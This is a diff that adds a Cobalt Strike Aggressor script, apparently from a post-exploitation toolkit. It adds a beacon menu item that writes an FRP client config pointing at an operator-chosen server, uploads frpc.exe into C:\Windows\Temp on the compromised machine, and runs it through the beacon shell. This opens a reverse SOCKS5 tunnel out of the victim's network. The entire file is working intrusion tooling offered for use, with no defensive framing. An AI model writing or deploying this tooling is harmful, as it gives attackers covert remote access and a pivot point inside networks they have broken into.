@@ -1,0 +1,28 @@
+sub FRP {
+    $out = openf(">".script_resource("frpc/frpc.ini"));
+    writeb($out, "[common]\nserver_addr=".$3['IP']."\nserver_port=".$3['PORT']."\n[http_proxy]\ntype = tcp\nremote_port = ".$3['PPORT']."\nplugin = socks5");
+    closef($out);
+    bcd($bid, $3['UploadPath']);
+    bupload($bid, script_resource("frpc/frpc.ini"));
+    if (-is64 $bid['id']) {
+        bupload($bid, script_resource("frpc/x64/frpc.exe"));
+    }else{
+        bupload($bid, script_resource("frpc/x86/frpc.exe"));
+    }
+    bshell($bid, $3['UploadPath']."frpc.exe -c ".$3['UploadPath']."frpc.ini");
+}
+
+popup beacon_bottom {
+    menu "FRP" {
+        item "Upload And Run FRP" {
+            $bid = $1;
+            $dialog = dialog("Upload FRP Config", %(UploadPath => "C:\\Windows\\Temp\\", IP => "127.0.0.1", PORT => "7000",PPORT => "6005",bid => $bid), &FRP);
+            drow_text($dialog, "UploadPath",  "Upload Path: "); 	
+            drow_text($dialog, "IP",  "Server IP: ");
+            drow_text($dialog, "PORT",  "Server PORT: ");
+            drow_text($dialog, "PPORT",  "Proxy PORT: ");
+            dbutton_action($dialog, "Upload And Run!");
+            dialog_show($dialog);
+        }
+    }
+}
